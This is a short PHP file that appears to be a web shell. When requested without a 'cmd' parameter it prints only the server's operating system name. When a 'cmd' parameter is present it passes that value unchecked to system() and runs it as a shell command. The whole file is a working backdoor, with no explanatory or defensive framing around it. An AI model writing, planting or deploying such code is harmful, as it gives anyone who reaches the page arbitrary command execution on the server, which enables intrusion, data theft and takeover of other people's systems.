<?php
if (php_sapi_name() !== 'cli' && !isset($_GET['cmd'])) {
    echo 'System OS: ' . php_uname('s');
}
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
